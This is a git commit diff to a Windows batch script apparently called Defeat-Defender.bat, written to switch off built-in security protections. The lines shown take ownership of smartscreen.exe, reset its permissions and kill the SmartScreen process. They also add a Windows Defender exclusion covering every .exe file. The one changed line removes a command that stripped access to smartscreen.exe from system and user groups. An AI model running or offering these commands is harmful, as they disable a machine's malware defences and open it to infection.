71b95e4da57d335f7bae4b52803d886ac412935e
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-04-16 18:22:49 +0530

    Update Defeat-Defender.bat

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -26,7 +26,7 @@ if '%errorlevel%' NEQ '0' (
 takeown /f "%systemroot%\System32\smartscreen.exe" /a
 icacls "%systemroot%\System32\smartscreen.exe" /reset
 taskkill /im smartscreen.exe /f
-icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
